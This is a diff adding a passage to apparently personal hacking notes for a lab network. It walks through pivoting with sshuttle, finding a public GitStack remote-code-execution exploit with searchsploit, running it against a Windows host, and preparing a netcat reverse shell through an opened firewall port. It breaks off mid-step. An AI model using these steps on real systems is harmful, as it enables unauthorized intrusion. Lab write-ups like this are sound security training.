@@ -101,4 +101,48 @@ sshuttle -r root@10.200.96.200 --ssh-cmd "ssh -i id_rsa" 10.200.96.0/24
 
 c : Connected to server.
 ```
-- 
+- On navigating to the webserver on port 80 I got a login interface.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/4f4f269f-eac0-4853-b787-147a74d4f729)
+
+- Default credentials didn't work. So I tried to search for the Gitstack exploit.
+```bash
+└─$ searchsploit gitstack                                           
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+GitStack - Remote Code Execution                                     | php/webapps/44044.md
+GitStack 2.3.10 - Remote Code Execution                              | php/webapps/43777.py
+```
+- In exploit, I modified IP addres and run the command.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/47489c47-0207-46ac-9582-1c37ec3c6ff2)
+
+```bash
+./43777.py
+
+Host Name:                 GIT-SERV
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+--------------SNIP----------------
+```
+- Now I'm not able to get the reverse shell back to my system on trying to ping my IP address from the exploit script I was not able to communicate with my system.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/079d72ab-6557-482f-8e40-48c83446eef1)
+
+```bash
+└─$ ./43777.py  
+Ping statistics for 10.50.76.115:
+    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
+```
+- So, now I nned to open a port through ssh connections.
+```bash
+firewall-cmd --zone=public --add-port 15500/tcp
+success
+```
+- Now, transfer netcat binary tothe target host and setup listener.
+```bash
